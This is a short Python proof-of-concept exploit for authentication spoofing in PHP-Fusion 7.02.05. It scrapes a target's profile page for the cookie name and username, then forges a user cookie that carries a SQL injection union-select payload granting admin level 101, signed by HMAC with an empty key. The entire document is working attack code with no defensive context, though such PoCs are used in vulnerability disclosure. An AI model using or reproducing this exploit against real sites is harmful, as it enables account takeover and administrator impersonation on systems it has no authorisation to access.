# Proof of Concept
# PHP-Fusion 7.02.05
# Authentication spoofing
# Author: vnd at vndh.net
from http import client
from time import time
import hashlib
import hmac
import re

def generateCookie(address, path, userid, password = 'admin'):
  connection = client.HTTPConnection(address)
  connection.request("GET", "%s/profile.php?lookup=%d" % (path, userid))
  response = connection.getresponse()
  if response.status != 200: raise BaseException("bad status")
  cookies = response.getheader("Set-Cookie")
  pattern = re.compile("([A-Z0-9\_]+)lastvisit", re.IGNORECASE)
  cookiesearch = pattern.search(cookies)
  if cookiesearch == None: raise BaseException("bad cookie")
  cookiename = cookiesearch.groups()
  cookiename = "%suser" % cookiename[0]
  source = response.read()
  connection.close()
  source = source.decode("utf-8")
  pattern = re.compile("<!--profile_user_name-->(.*)<")
  username = pattern.search(source).groups()
  username = username[0]

  injection = "-1' union select %d,'%s','sha256','','%s'%s,101%s -- " % (userid, username, password, ",0" * 15,",0" * 12)
  expiration = str(int(time() + 86400))
  userhash = ""
  userhash = hmac.new(bytes(userhash.encode("utf-8")), bytes(("%s%s" % (injection, expiration)).encode("utf-8")), hashlib.sha256).hexdigest()
  userhash = hmac.new(bytes(userhash.encode("utf-8")), bytes(("%s%s" % (injection, expiration)).encode("utf-8")), hashlib.sha256).hexdigest()

  return (cookiename, ".".join([injection, expiration, userhash]))
